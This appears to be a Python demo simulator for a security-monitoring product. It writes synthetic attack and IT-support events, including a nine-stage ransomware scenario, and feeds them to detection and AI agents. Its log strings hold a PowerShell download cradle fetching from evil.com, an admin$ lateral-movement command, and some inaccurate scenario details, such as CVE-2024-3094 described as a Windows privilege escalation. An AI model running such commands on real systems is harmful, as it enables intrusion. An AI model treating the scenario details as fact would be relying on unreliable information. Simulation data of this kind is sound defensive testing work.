"""
SecureFlow AI - Demo Simulator
Generates realistic security events and IT support scenarios for demonstration.
Runs the complete pipeline: Log → Detect → Triage → Investigate → Remediate → Report → Ticket.
"""

import random
from datetime import datetime, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session
from app.models.event import Event
from app.models.alert import Alert
from app.detection.rule_engine import run_all_rules
from app.detection.behavioral import run_behavioral_detection
from app.detection.correlator import correlate_alerts
from app.agents.orchestrator import Orchestrator


# Realistic sample data pools
ATTACKER_IPS = [
    "185.220.101.34", "45.33.32.156", "192.168.1.100",
    "103.224.182.250", "91.121.87.18", "198.51.100.23",
    "203.0.113.42", "172.16.254.1",
]
TARGET_IPS = ["10.0.1.10", "10.0.1.20", "10.0.1.30", "10.0.2.10", "10.0.2.20"]
USERNAMES = ["admin", "root", "jsmith", "agarcia", "kwilson", "mchen", "djones", "lbrown"]
HOSTNAMES = ["web-server-01", "db-server-01", "app-server-01", "workstation-42", "dc-01"]


def generate_ssh_brute_force(db: Session) -> Dict[str, Any]:
    """Generate SSH brute force attack scenario."""
    attacker_ip = random.choice(ATTACKER_IPS[:4])
    target_ip = random.choice(TARGET_IPS)
    now = datetime.utcnow()
    events = []

    # Generate 15 failed SSH login attempts over 2 minutes
    for i in range(15):
        ts = now - timedelta(seconds=random.randint(0, 120))
        username = random.choice(USERNAMES[:4])
        raw_log = (
            f"{ts.strftime('%b %d %H:%M:%S')} {target_ip} sshd[{random.randint(1000,9999)}]: "
            f"Failed password for {username} from {attacker_ip} port {random.randint(40000,65000)} ssh2"
        )
        event = Event(
            source_type="linux",
            source_name="sshd",
            raw_log=raw_log,
            normalized_data={"dest_port": 22, "auth_method": "password"},
            severity="medium",
            confidence=0.9,
            mitre_technique="T1110.001",
            mitre_tactic="Credential Access",
            source_ip=attacker_ip,
            dest_ip=target_ip,
            username=username,
            action="login_failed",
            timestamp=ts,
        )
        db.add(event)
        events.append({
            "source_type": "linux", "source_name": "sshd", "raw_log": raw_log,
            "source_ip": attacker_ip, "dest_ip": target_ip, "username": username,
            "action": "login_failed", "timestamp": ts, "severity": "medium",
            "confidence": 0.9, "normalized_data": {"dest_port": 22},
        })

    db.commit()

    # Run detection
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    # Run full AI analysis on first alert
    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        alert_dict = _alert_to_dict(created_alerts[0])
        analysis_result = orchestrator.analyze_alert(alert_dict, db)

    return {
        "scenario": "SSH Brute Force Attack",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": (
            f"Simulated SSH brute force attack from {attacker_ip} targeting {target_ip}. "
            f"Generated {len(events)} failed login events, detected by rule engine, "
            f"and processed through the full AI analysis pipeline."
        ),
    }


def generate_port_scan(db: Session) -> Dict[str, Any]:
    """Generate port scan scenario."""
    attacker_ip = random.choice(ATTACKER_IPS)
    target_ip = random.choice(TARGET_IPS)
    now = datetime.utcnow()
    events = []
    ports = random.sample(range(1, 10000), 25)

    for port in ports:
        ts = now - timedelta(seconds=random.randint(0, 30))
        raw_log = (
            f"{ts.strftime('%Y-%m-%dT%H:%M:%S')} suricata[alert]: "
            f"ET SCAN Potential Port Scan from {attacker_ip} to {target_ip}:{port}"
        )
        event = Event(
            source_type="network", source_name="suricata", raw_log=raw_log,
            normalized_data={"dest_port": port, "protocol": "tcp"},
            severity="medium", confidence=0.85,
            mitre_technique="T1046", mitre_tactic="Discovery",
            source_ip=attacker_ip, dest_ip=target_ip,
            action="port_scan", timestamp=ts,
        )
        db.add(event)
        events.append({
            "source_type": "network", "source_name": "suricata", "raw_log": raw_log,
            "source_ip": attacker_ip, "dest_ip": target_ip, "action": "port_scan",
            "timestamp": ts, "normalized_data": {"dest_port": port},
        })

    db.commit()
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        analysis_result = orchestrator.analyze_alert(_alert_to_dict(created_alerts[0]), db)

    return {
        "scenario": "Port Scan",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": f"Simulated port scan from {attacker_ip} scanning {len(ports)} ports on {target_ip}.",
    }


def generate_malware_activity(db: Session) -> Dict[str, Any]:
    """Generate malware activity scenario."""
    target_ip = random.choice(TARGET_IPS)
    hostname = random.choice(HOSTNAMES)
    username = random.choice(USERNAMES)
    now = datetime.utcnow()
    events = []

    # Suspicious download
    raw1 = (
        f"{now.strftime('%Y-%m-%d %H:%M:%S')} {hostname} powershell.exe: "
        f"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') "
        f"-ExecutionPolicy Bypass -WindowStyle Hidden"
    )
    event1 = Event(
        source_type="windows", source_name="powershell",
        raw_log=raw1, severity="critical", confidence=0.92,
        mitre_technique="T1059.001", mitre_tactic="Execution",
        source_ip=target_ip, dest_ip=target_ip, username=username,
        action="suspicious_process", timestamp=now,
        normalized_data={"process": "powershell.exe", "parent_process": "cmd.exe"},
    )
    db.add(event1)
    events.append({
        "source_type": "windows", "source_name": "powershell", "raw_log": raw1,
        "source_ip": target_ip, "dest_ip": target_ip, "username": username,
        "action": "suspicious_process", "timestamp": now, "severity": "critical",
    })

    # C2 communication
    raw2 = (
        f"{now.strftime('%Y-%m-%d %H:%M:%S')} {hostname} suricata[alert]: "
        f"ET MALWARE Possible C2 Beacon from {target_ip} to 198.51.100.99:443"
    )
    event2 = Event(
        source_type="network", source_name="suricata",
        raw_log=raw2, severity="critical", confidence=0.88,
        mitre_technique="T1071", mitre_tactic="Command and Control",
        source_ip=target_ip, dest_ip="198.51.100.99",
        action="c2_communication", timestamp=now + timedelta(seconds=30),
    )
    db.add(event2)
    events.append({
        "source_type": "network", "source_name": "suricata", "raw_log": raw2,
        "source_ip": target_ip, "dest_ip": "198.51.100.99",
        "action": "c2_communication", "timestamp": now + timedelta(seconds=30),
    })

    db.commit()
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        analysis_result = orchestrator.analyze_alert(_alert_to_dict(created_alerts[0]), db)

    return {
        "scenario": "Malware Activity",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": f"Simulated malware execution with PowerShell download cradle and C2 communication on {hostname}.",
    }


def generate_privilege_escalation(db: Session) -> Dict[str, Any]:
    """Generate privilege escalation scenario."""
    target_ip = random.choice(TARGET_IPS)
    username = random.choice(USERNAMES[2:])  # Non-root users
    now = datetime.utcnow()
    events = []

    # Sudo to root
    raw = (
        f"{now.strftime('%b %d %H:%M:%S')} {target_ip} sudo: "
        f"{username} : TTY=pts/0 ; PWD=/home/{username} ; "
        f"USER=root ; COMMAND=/bin/bash"
    )
    event = Event(
        source_type="linux", source_name="auth.log",
        raw_log=raw, severity="critical", confidence=0.87,
        mitre_technique="T1548", mitre_tactic="Privilege Escalation",
        source_ip=target_ip, dest_ip=target_ip, username=username,
        action="privilege_escalation", timestamp=now,
        normalized_data={"method": "sudo", "target_user": "root"},
    )
    db.add(event)
    events.append({
        "source_type": "linux", "source_name": "auth.log", "raw_log": raw,
        "source_ip": target_ip, "dest_ip": target_ip, "username": username,
        "action": "privilege_escalation", "timestamp": now,
        "normalized_data": {"method": "sudo", "target_user": "root"},
    })

    db.commit()
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        analysis_result = orchestrator.analyze_alert(_alert_to_dict(created_alerts[0]), db)

    return {
        "scenario": "Privilege Escalation",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": f"Simulated privilege escalation: {username} escalated to root via sudo on {target_ip}.",
    }


def generate_vpn_failure(db: Session) -> Dict[str, Any]:
    """Generate VPN failure IT support scenario."""
    orchestrator = Orchestrator()
    result = orchestrator.handle_chat_message(
        "My VPN is not connecting. I keep getting a timeout error when I try to connect to the corporate VPN. "
        "I've been trying for 30 minutes and I can't access any internal resources.",
        session_type="it_support", db=db,
    )
    return {
        "scenario": "VPN Failure",
        "events_generated": 0,
        "alerts_created": 0,
        "analysis": result,
        "description": "Simulated VPN connection failure with IT support troubleshooting.",
    }


def generate_email_outage(db: Session) -> Dict[str, Any]:
    """Generate email outage IT support scenario."""
    orchestrator = Orchestrator()
    result = orchestrator.handle_chat_message(
        "I can't send or receive emails since this morning. Outlook keeps showing 'disconnected' "
        "and webmail is also very slow. Several people in my team have the same issue.",
        session_type="it_support", db=db,
    )
    return {
        "scenario": "Email Outage",
        "events_generated": 0,
        "alerts_created": 0,
        "analysis": result,
        "description": "Simulated email outage with IT support diagnosis.",
    }


def generate_printer_issue(db: Session) -> Dict[str, Any]:
    """Generate printer issue IT support scenario."""
    orchestrator = Orchestrator()
    result = orchestrator.handle_chat_message(
        "The network printer on the 3rd floor is showing offline. I've tried printing from multiple "
        "computers and none of them can reach the printer. The printer display shows it's ready.",
        session_type="it_support", db=db,
    )
    return {
        "scenario": "Printer Issue",
        "events_generated": 0,
        "alerts_created": 0,
        "analysis": result,
        "description": "Simulated network printer offline issue with troubleshooting.",
    }


def generate_operation_nightowl(db: Session) -> Dict[str, Any]:
    """
    Operation NightOwl — Full APT29 Multi-Stage Ransomware Campaign.
    Simulates the complete attack kill chain: Recon → Initial Access → Privilege Escalation
    → Lateral Movement → Malware Execution → C2 → Data Exfiltration → Encryption.
    This is the flagship demo scenario for hackathon judges.
    """
    now = datetime.utcnow()
    attacker_ip = "185.220.101.34"   # Known APT29 / Tor exit node
    c2_ip = "91.121.87.18"           # APT29 C2 server
    victim_user = "john.miller"
    workstation = "WKSTN-047"
    api_gw = "API-GW-01"
    db_server = "DB-PROD-01"
    events = []
    all_created_alerts = []

    # ── Stage 1: Credential Stuffing / Brute Force (T1110) ──────────────────
    for i in range(47):
        ts = now - timedelta(seconds=300 - i * 6)
        raw = (f"{ts.strftime('%b %d %H:%M:%S')} vpn-gw sshd[{8000+i}]: "
               f"Failed password for {victim_user} from {attacker_ip} port {50000+i} ssh2")
        e = Event(source_type="network", source_name="vpn-gateway", raw_log=raw,
                  normalized_data={"dest_port": 22, "auth_method": "password", "attempt": i + 1},
                  severity="high", confidence=0.92, mitre_technique="T1110",
                  mitre_tactic="Credential Access", source_ip=attacker_ip,
                  dest_ip="10.0.0.1", username=victim_user, action="login_failed", timestamp=ts)
        db.add(e)
        events.append({"source_type": "network", "source_name": "vpn-gateway", "raw_log": raw,
                       "source_ip": attacker_ip, "dest_ip": "10.0.0.1", "username": victim_user,
                       "action": "login_failed", "timestamp": ts, "severity": "high",
                       "confidence": 0.92, "normalized_data": {"dest_port": 22}})
    db.commit()

    # ── Stage 2: Successful Login (T1078) ────────────────────────────────────
    ts2 = now - timedelta(seconds=240)
    raw2 = (f"{ts2.strftime('%b %d %H:%M:%S')} vpn-gw sshd[8100]: "
            f"Accepted password for {victim_user} from {attacker_ip} port 54321 ssh2")
    e2 = Event(source_type="network", source_name="vpn-gateway", raw_log=raw2,
               normalized_data={"dest_port": 22, "auth_method": "password", "success": True},
               severity="critical", confidence=0.97, mitre_technique="T1078",
               mitre_tactic="Initial Access", source_ip=attacker_ip,
               dest_ip="10.0.0.1", username=victim_user, action="login_success", timestamp=ts2)
    db.add(e2)
    events.append({"source_type": "network", "source_name": "vpn-gateway", "raw_log": raw2,
                   "source_ip": attacker_ip, "dest_ip": "10.0.0.1", "username": victim_user,
                   "action": "login_success", "timestamp": ts2, "severity": "critical",
                   "confidence": 0.97, "normalized_data": {"dest_port": 22}})
    db.commit()

    # ── Stage 3: Privilege Escalation (T1068 — CVE-2024-3094) ───────────────
    ts3 = now - timedelta(seconds=180)
    raw3 = (f"{ts3.strftime('%Y-%m-%dT%H:%M:%S')} {workstation} kernel: "
            f"[CVE-2024-3094] Exploit attempt by {victim_user}: local→root "
            f"via liblzma injection. Process: sshd PID 1337")
    e3 = Event(source_type="windows", source_name="edr-agent", raw_log=raw3,
               normalized_data={"cve": "CVE-2024-3094", "exploit_type": "local_priv_esc"},
               severity="critical", confidence=0.95, mitre_technique="T1068",
               mitre_tactic="Privilege Escalation", source_ip="10.0.1.47",
               dest_ip="10.0.1.47", username=victim_user, action="privilege_escalation",
               timestamp=ts3)
    db.add(e3)
    events.append({"source_type": "windows", "source_name": "edr-agent", "raw_log": raw3,
                   "source_ip": "10.0.1.47", "dest_ip": "10.0.1.47", "username": victim_user,
                   "action": "privilege_escalation", "timestamp": ts3, "severity": "critical",
                   "confidence": 0.95, "normalized_data": {"cve": "CVE-2024-3094"}})
    db.commit()

    # ── Stage 4: Lateral Movement (T1021 — Remote Services) ─────────────────
    ts4 = now - timedelta(seconds=150)
    raw4 = (f"{ts4.strftime('%Y-%m-%dT%H:%M:%S')} {workstation} wmi[PID 2048]: "
            f"Remote WMI execution: {victim_user}@{workstation} → {api_gw} "
            f"cmd='net use \\\\{api_gw}\\admin$ /user:DOMAIN\\SYSTEM'")
    e4 = Event(source_type="windows", source_name="windows-security", raw_log=raw4,
               normalized_data={"method": "WMI", "source_host": workstation, "target_host": api_gw},
               severity="critical", confidence=0.93, mitre_technique="T1021",
               mitre_tactic="Lateral Movement", source_ip="10.0.1.47",
               dest_ip="10.0.2.10", username=victim_user, action="lateral_movement",
               timestamp=ts4)
    db.add(e4)
    events.append({"source_type": "windows", "source_name": "windows-security", "raw_log": raw4,
                   "source_ip": "10.0.1.47", "dest_ip": "10.0.2.10", "username": victim_user,
                   "action": "lateral_movement", "timestamp": ts4, "severity": "critical",
                   "confidence": 0.93, "normalized_data": {"method": "WMI"}})
    db.commit()

    # ── Stage 5: Malware Drop (T1204 — Akira Ransomware) ────────────────────
    ts5 = now - timedelta(seconds=120)
    raw5 = (f"{ts5.strftime('%Y-%m-%dT%H:%M:%S')} {api_gw} edr[critical]: "
            f"Suspicious binary created: C:\\ProgramData\\svchost32.exe "
            f"SHA256=4a2c8b1f9e3d7a... "
            f"Parent: cmd.exe | Matched: Akira-ransomware-family | YARA: akira_v2")
    e5 = Event(source_type="windows", source_name="edr-agent", raw_log=raw5,
               normalized_data={"file": "svchost32.exe", "sha256": "4a2c8b1f9e3d7a",
                                 "malware_family": "Akira", "yara_match": "akira_v2"},
               severity="critical", confidence=0.98, mitre_technique="T1204",
               mitre_tactic="Execution", source_ip="10.0.2.10",
               dest_ip="10.0.2.10", username="SYSTEM", action="malware_execution",
               timestamp=ts5)
    db.add(e5)
    events.append({"source_type": "windows", "source_name": "edr-agent", "raw_log": raw5,
                   "source_ip": "10.0.2.10", "dest_ip": "10.0.2.10", "username": "SYSTEM",
                   "action": "malware_execution", "timestamp": ts5, "severity": "critical",
                   "confidence": 0.98, "normalized_data": {"malware_family": "Akira"}})
    db.commit()

    # ── Stage 6: C2 Beacon (T1071) ───────────────────────────────────────────
    ts6 = now - timedelta(seconds=100)
    raw6 = (f"{ts6.strftime('%Y-%m-%dT%H:%M:%S')} {api_gw} suricata[alert]: "
            f"ET MALWARE APT29 CobaltStrike Beacon: {api_gw}:4444 → {c2_ip}:443 "
            f"[Encrypted C2 traffic, JA3: 4a91b15...] ThreatIQ: APT29-CozyBear")
    e6 = Event(source_type="network", source_name="suricata", raw_log=raw6,
               normalized_data={"c2_ip": c2_ip, "protocol": "HTTPS", "ja3": "4a91b15",
                                 "threat_actor": "APT29"},
               severity="critical", confidence=0.96, mitre_technique="T1071",
               mitre_tactic="Command and Control", source_ip="10.0.2.10",
               dest_ip=c2_ip, username="SYSTEM", action="c2_communication",
               timestamp=ts6)
    db.add(e6)
    events.append({"source_type": "network", "source_name": "suricata", "raw_log": raw6,
                   "source_ip": "10.0.2.10", "dest_ip": c2_ip, "username": "SYSTEM",
                   "action": "c2_communication", "timestamp": ts6, "severity": "critical",
                   "confidence": 0.96, "normalized_data": {"threat_actor": "APT29"}})
    db.commit()

    # ── Stage 7: Data Staging (T1074) ────────────────────────────────────────
    ts7 = now - timedelta(seconds=75)
    raw7 = (f"{ts7.strftime('%Y-%m-%dT%H:%M:%S')} {db_server} dlp[alert]: "
            f"Mass data staging detected: 2.3GB copied from \\\\{db_server}\\customers "
            f"to C:\\Windows\\Temp\\~tmp8472\\ by SYSTEM in 47 seconds")
    e7 = Event(source_type="windows", source_name="dlp-agent", raw_log=raw7,
               normalized_data={"bytes": 2_300_000_000, "source": f"\\\\{db_server}\\customers",
                                 "dest": "C:\\Windows\\Temp\\~tmp8472"},
               severity="critical", confidence=0.91, mitre_technique="T1074",
               mitre_tactic="Collection", source_ip="10.0.2.20",
               dest_ip="10.0.2.20", username="SYSTEM", action="data_staging",
               timestamp=ts7)
    db.add(e7)
    events.append({"source_type": "windows", "source_name": "dlp-agent", "raw_log": raw7,
                   "source_ip": "10.0.2.20", "dest_ip": "10.0.2.20", "username": "SYSTEM",
                   "action": "data_staging", "timestamp": ts7, "severity": "critical",
                   "confidence": 0.91, "normalized_data": {"bytes": 2_300_000_000}})
    db.commit()

    # ── Stage 8: Exfiltration (T1048) ────────────────────────────────────────
    ts8 = now - timedelta(seconds=45)
    raw8 = (f"{ts8.strftime('%Y-%m-%dT%H:%M:%S')} fw-01 checkpoint: "
            f"HTTPS outbound data transfer: {api_gw} → {c2_ip}:443 "
            f"2.3GB transferred in 38s — ANOMALY: 900x above baseline. "
            f"GeoIP: RU (TOR Exit Node)")
    e8 = Event(source_type="network", source_name="firewall", raw_log=raw8,
               normalized_data={"bytes_out": 2_300_000_000, "dest_country": "RU",
                                 "is_tor": True, "anomaly_ratio": 900},
               severity="critical", confidence=0.99, mitre_technique="T1048",
               mitre_tactic="Exfiltration", source_ip="10.0.2.10",
               dest_ip=c2_ip, username="SYSTEM", action="data_exfiltration",
               timestamp=ts8)
    db.add(e8)
    events.append({"source_type": "network", "source_name": "firewall", "raw_log": raw8,
                   "source_ip": "10.0.2.10", "dest_ip": c2_ip, "username": "SYSTEM",
                   "action": "data_exfiltration", "timestamp": ts8, "severity": "critical",
                   "confidence": 0.99, "normalized_data": {"bytes_out": 2_300_000_000}})
    db.commit()

    # ── Stage 9: Ransomware Encryption (T1486) ───────────────────────────────
    ts9 = now - timedelta(seconds=15)
    raw9 = (f"{ts9.strftime('%Y-%m-%dT%H:%M:%S')} {api_gw} edr[CRITICAL]: "
            f"RANSOMWARE DETECTED: svchost32.exe encrypting file system. "
            f"3,847 files encrypted in 15s. Extension: .akira "
            f"Ransom note: C:\\README_RESTORE.txt created. "
            f"Shadow copies being deleted via vssadmin")
    e9 = Event(source_type="windows", source_name="edr-agent", raw_log=raw9,
               normalized_data={"files_encrypted": 3847, "extension": ".akira",
                                 "ransom_note": "README_RESTORE.txt",
                                 "shadow_copies_deleted": True},
               severity="critical", confidence=1.0, mitre_technique="T1486",
               mitre_tactic="Impact", source_ip="10.0.2.10",
               dest_ip="10.0.2.10", username="SYSTEM", action="ransomware_encryption",
               timestamp=ts9)
    db.add(e9)
    events.append({"source_type": "windows", "source_name": "edr-agent", "raw_log": raw9,
                   "source_ip": "10.0.2.10", "dest_ip": "10.0.2.10", "username": "SYSTEM",
                   "action": "ransomware_encryption", "timestamp": ts9, "severity": "critical",
                   "confidence": 1.0, "normalized_data": {"files_encrypted": 3847}})
    db.commit()

    # ── Run detection rules ───────────────────────────────────────────────────
    alerts_data = run_all_rules(events, db)
    all_created_alerts = _store_alerts(db, alerts_data)

    # ── Run AI orchestration on the critical alert ────────────────────────────
    analysis_result = None
    if all_created_alerts:
        orchestrator = Orchestrator()
        # Pick the most severe alert for deep analysis
        critical = next(
            (a for a in all_created_alerts if a.severity == "critical"),
            all_created_alerts[0]
        )
        alert_dict = _alert_to_dict(critical)
        alert_dict.update({
            "mitre_id": "T1486",
            "mitre_tactic": "Impact",
            "mitre_technique_name": "Data Encrypted for Impact",
            "source_ip": attacker_ip,
            "description": (
                "APT29 ransomware campaign: 47 brute-force attempts → compromised VPN credential "
                "→ CVE-2024-3094 privilege escalation → WMI lateral movement to API-GW → "
                "Akira ransomware deployment → C2 beacon (APT29/CozyBear) → "
                "2.3GB data exfiltration → file system encryption (3,847 files). "
                "Threat actor: APT29 | Impact: Critical"
            ),
        })
        analysis_result = orchestrator.analyze_alert(alert_dict, db)

        # ── Trigger Autonomous Response to populate XAI queue ──
        try:
            from app.api.autonomous import get_agent as get_autonomous_agent
            from app.knowledge.incident_memory import recall_similar_incidents
            from app.knowledge.rag_engine import get_rag_engine
            from app.models.agent_action import AgentAction
            
            auto_agent = get_autonomous_agent()
            
            # Fetch real memory match
            mem_matches = recall_similar_incidents("APT29 ransomware credential stuffing VPN", top_k=1)
            memory_match = mem_matches[0] if mem_matches else None
            
            # Fetch real RAG context
            rag = get_rag_engine()
            rag_results = rag.search("APT29 ransomware T1486 T1110", top_k=2)
            
            # Log memory agent activity
            if memory_match:
                mem_action = AgentAction(
                    agent_name="memory_agent",
                    action_type="incident_recall",
                    input_summary="APT29 ransomware indicator match",
                    output_summary=f"Episodic Match Found: {memory_match.get('title')} (Sim: {memory_match.get('similarity_pct')})",
                    confidence=memory_match.get('similarity_score', 0.89),
                    status="completed",
                    related_alert_id=critical.id
                )
                db.add(mem_action)
                
            # Log threat intel activity
            if rag_results:
                ti_action = AgentAction(
                    agent_name="threat_intel_agent",
                    action_type="rag_enrichment",
                    input_summary="MITRE/CISA context retrieval",
                    output_summary=f"Correlated T1110, T1078, T1486 to APT29 / CozyBear campaigns",
                    confidence=0.94,
                    status="completed",
                    related_alert_id=critical.id
                )
                db.add(ti_action)
                
            db.commit()
            
            # Prepare incident data for autonomous agent
            incident_payload = {
                "id": analysis_result.get("incident_id", 999),
                "title": "Operation NightOwl — APT29 Ransomware Campaign",
                "severity": "critical",
                "threat_actor": "APT29",
                "affected_assets": [workstation, api_gw, db_server],
                "mitre_techniques": ["T1110", "T1078", "T1068", "T1021", "T1204", "T1071", "T1048", "T1486"],
                "memory_match": memory_match,
                "rag_evidence": rag_results
            }
            
            # Trigger it to populate the queue
            auto_agent.process(incident_payload)
        except Exception as e:
            print(f"Failed to trigger autonomous response: {e}")
            db.rollback()

    return {
        "scenario": "Operation NightOwl — APT29 Ransomware Campaign",
        "events_generated": len(events),
        "alerts_created": len(all_created_alerts),
        "stages": [
            {"stage": 1, "name": "Credential Stuffing",    "technique": "T1110", "events": 47},
            {"stage": 2, "name": "Initial Access",          "technique": "T1078", "events": 1},
            {"stage": 3, "name": "Privilege Escalation",    "technique": "T1068", "events": 1},
            {"stage": 4, "name": "Lateral Movement",        "technique": "T1021", "events": 1},
            {"stage": 5, "name": "Malware Execution",       "technique": "T1204", "events": 1},
            {"stage": 6, "name": "C2 Communication",        "technique": "T1071", "events": 1},
            {"stage": 7, "name": "Data Staging",            "technique": "T1074", "events": 1},
            {"stage": 8, "name": "Data Exfiltration",       "technique": "T1048", "events": 1},
            {"stage": 9, "name": "Ransomware Encryption",   "technique": "T1486", "events": 1},
        ],
        "threat_actor": "APT29 / CozyBear",
        "attacker_ip": attacker_ip,
        "victim": victim_user,
        "assets_compromised": [workstation, api_gw, db_server],
        "analysis": analysis_result,
        "description": (
            "Full 9-stage APT29 ransomware campaign: credential stuffing → VPN compromise → "
            "privilege escalation (CVE-2024-3094) → WMI lateral movement → Akira ransomware → "
            "C2 beacon → 2.3GB exfiltration → 3,847 files encrypted. "
            f"Generated {len(events)} events and {len(all_created_alerts)} alerts."
        ),
    }


# Scenario registry
SCENARIOS = {
    "operation_nightowl": {
        "name": "🚨 Operation NightOwl — APT29 Ransomware",
        "description": (
            "FLAGSHIP DEMO: Full 9-stage ransomware campaign by APT29 (CozyBear). "
            "Credential stuffing → VPN breach → CVE-2024-3094 priv-esc → WMI lateral movement → "
            "Akira malware → C2 beacon → 2.3GB data exfil → 3,847 files encrypted. "
            "Triggers all 5 AI agents across the full MITRE ATT&CK kill chain."
        ),
        "type": "flagship",
        "generator": generate_operation_nightowl,
    },
    "ssh_brute_force": {
        "name": "SSH Brute Force Attack",
        "description": "Simulates 15 failed SSH login attempts from an external IP, triggering detection and full AI analysis pipeline.",
        "type": "security",
        "generator": generate_ssh_brute_force,
    },
    "port_scan": {
        "name": "Port Scan",
        "description": "Simulates network reconnaissance with 25 ports scanned from a single source IP.",
        "type": "security",
        "generator": generate_port_scan,
    },
    "malware_activity": {
        "name": "Malware Activity",
        "description": "Simulates PowerShell download cradle execution and C2 beacon communication.",
        "type": "security",
        "generator": generate_malware_activity,
    },
    "privilege_escalation": {
        "name": "Privilege Escalation",
        "description": "Simulates a user escalating to root privileges via sudo on a Linux server.",
        "type": "security",
        "generator": generate_privilege_escalation,
    },
    "vpn_failure": {
        "name": "VPN Connection Failure",
        "description": "Simulates an employee unable to connect to corporate VPN, triggering IT support workflow.",
        "type": "it_support",
        "generator": generate_vpn_failure,
    },
    "email_outage": {
        "name": "Email Outage",
        "description": "Simulates email service disruption affecting multiple users.",
        "type": "it_support",
        "generator": generate_email_outage,
    },
    "printer_issue": {
        "name": "Printer Offline",
        "description": "Simulates a network printer going offline, requiring IT troubleshooting.",
        "type": "it_support",
        "generator": generate_printer_issue,
    },
}



def run_scenario(scenario_id: str, db: Session) -> Dict[str, Any]:
    """Run a specific demo scenario."""
    scenario = SCENARIOS.get(scenario_id)
    if not scenario:
        return {"error": f"Unknown scenario: {scenario_id}"}
    return scenario["generator"](db)


def run_all_scenarios(db: Session) -> List[Dict[str, Any]]:
    """Run all demo scenarios."""
    results = []
    for scenario_id in SCENARIOS:
        result = run_scenario(scenario_id, db)
        results.append(result)
    return results


def _store_alerts(db: Session, alerts_data: List[Dict]) -> List[Alert]:
    """Store generated alerts in the database."""
    created = []
    for data in alerts_data:
        alert = Alert(
            alert_type=data["alert_type"],
            severity=data["severity"],
            confidence=data["confidence"],
            title=data["title"],
            description=data.get("description"),
            affected_assets=data.get("affected_assets"),
            evidence=data.get("evidence"),
            mitre_id=data.get("mitre_id"),
            mitre_tactic=data.get("mitre_tactic"),
            mitre_technique_name=data.get("mitre_technique_name"),
            source_ip=data.get("source_ip"),
            dest_ip=data.get("dest_ip"),
            status="open",
            priority="P3",
        )
        db.add(alert)
        created.append(alert)
    db.commit()
    for a in created:
        db.refresh(a)
    return created


def _alert_to_dict(alert: Alert) -> Dict:
    """Convert Alert ORM object to dictionary."""
    return {
        "id": alert.id,
        "alert_type": alert.alert_type,
        "severity": alert.severity,
        "confidence": alert.confidence,
        "title": alert.title,
        "description": alert.description,
        "affected_assets": alert.affected_assets,
        "evidence": alert.evidence or {},
        "mitre_id": alert.mitre_id,
        "mitre_tactic": alert.mitre_tactic,
        "mitre_technique_name": alert.mitre_technique_name,
        "source_ip": alert.source_ip,
        "dest_ip": alert.dest_ip,
    }
